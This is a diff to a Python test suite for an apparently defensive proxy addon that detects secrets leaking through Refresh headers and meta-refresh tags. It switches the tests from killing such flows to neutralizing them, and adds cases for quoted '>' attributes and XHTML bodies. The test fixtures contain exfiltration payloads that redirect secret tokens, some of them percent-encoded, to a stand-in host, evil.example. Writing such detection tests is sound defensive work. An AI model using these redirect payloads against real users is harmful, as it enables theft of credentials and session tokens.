@@ -2659,10 +2659,13 @@ class RedirectSecretTests(unittest.TestCase):
 class RefreshSecretTests(unittest.TestCase):
     """Issue #860: a Refresh response header's url= target is followed
     by clients exactly like a redirect Location, so a secret-bearing
-    Refresh to a non-allowlisted host is refused at headers time —
-    neutralized, killed, audited — with the same decode-stage
-    detection as #94. A bare `Refresh: 5` (same-page refresh, no url=)
-    is not a navigation and is left alone."""
+    Refresh to a non-allowlisted host is neutralized at headers time
+    and audited, with the same decode-stage detection as #94. Unlike
+    #94's Location kill the flow is NOT killed: the header rewrite
+    provably removes the navigation vector, and the response (often a
+    200 with a real page, unlike a 3xx) still loads. A bare
+    `Refresh: 5` (same-page refresh, no url=) is not a navigation
+    and is left alone."""
 
     def _flow(self, status, refresh, host="github.com"):
         a = make_addon()
@@ -2672,11 +2675,12 @@ class RefreshSecretTests(unittest.TestCase):
         flow.response = resp
         return a, flow, resp
 
-    def test_refresh_secret_to_non_allowlisted_host_killed(self):
+    def test_refresh_secret_to_non_allowlisted_host_neutralized(self):
         a, flow, resp = self._flow(
             200, "0; url=https://evil.example/cb?token=" + SECRETS["github"])
         a.responseheaders(flow)
-        self.assertIsNotNone(flow.error)  # killed: nothing is forwarded
+        # Neutralized in place, NOT killed: the page still loads.
+        self.assertIsNone(flow.error)
         self.assertIn(("github.com", "refresh-secret-refused",
                        "evil.example"), a.audit_notes)
         for _, _, reason in a.audit_notes:
@@ -2685,18 +2689,20 @@ class RefreshSecretTests(unittest.TestCase):
         self.assertEqual(val, "hsurr:refresh-secret-refused")
         self.assertNotIn(SECRETS["github"], val)
 
-    def test_percent_encoded_secret_in_refresh_killed(self):
+    def test_percent_encoded_secret_in_refresh_neutralized(self):
         # An open redirector percent-encodes the value: the verbatim
         # header scrubber misses it, but the client decodes it on the
         # follow-up navigation.
         enc = urllib.parse.quote(SECRETS["pw"], safe="")
         refresh = "0;url=https://evil.example/cb?next=" + enc
         self.assertNotIn(SECRETS["pw"], refresh)  # encoded: blind spot
-        a, flow, _ = self._flow(200, refresh)
+        a, flow, resp = self._flow(200, refresh)
         a.responseheaders(flow)
-        self.assertIsNotNone(flow.error)
+        self.assertIsNone(flow.error)
         self.assertIn(("github.com", "refresh-secret-refused",
                        "evil.example"), a.audit_notes)
+        self.assertEqual(resp.headers.get("refresh"),
+                         "hsurr:refresh-secret-refused")
 
     def test_refresh_without_url_not_killed(self):
         # Bare delay = same-page refresh: no navigation target, no
@@ -2841,7 +2847,35 @@ class MetaRefreshSecretTests(unittest.TestCase):
         self.assertNotIn("hsurr:meta-refresh-secret-refused", resp.text)
         self.assertEqual(a.audit_notes, [])
 
-    def test_meta_refresh_multiple_tags_first_leak_neutralized(self):
+    def test_meta_refresh_gt_inside_quoted_attr_still_scanned(self):
+        # A `>` inside a quoted attribute BEFORE content must not
+        # truncate the tag: the browser parses (and follows) the full
+        # tag, so the scan must see it too.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" data-x="a>b" content="0;url='
+                b'https://evil.example/cb?k=' + enc.encode() + b'">')
+        a, flow, resp = self._flow(body)
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_xhtml_body_scanned(self):
+        # Browsers honor http-equiv=refresh in XHTML documents too.
+        enc = urllib.parse.quote(SECRETS["sess"], safe="")
+        body = (b'<meta http-equiv="refresh" content="0;url='
+                b'https://evil.example/cb?k=' + enc.encode() + b'"/>')
+        a, flow, resp = self._flow(body, ctype="application/xhtml+xml")
+        a.response(flow)
+        self.assertIsNone(flow.error)
+        self.assertIn("hsurr:meta-refresh-secret-refused", resp.text)
+        self.assertNotIn("evil.example/cb", resp.text)
+        self.assertIn(("github.com", "meta-refresh-secret-refused",
+                       "evil.example"), a.audit_notes)
+
+    def test_meta_refresh_multiple_tags_second_neutralized_first_untouched(self):
         enc = urllib.parse.quote(SECRETS["sess"], safe="")
         body = (b'<meta http-equiv="refresh" content="5">'
                 b'<meta http-equiv="refresh" content="0;url='
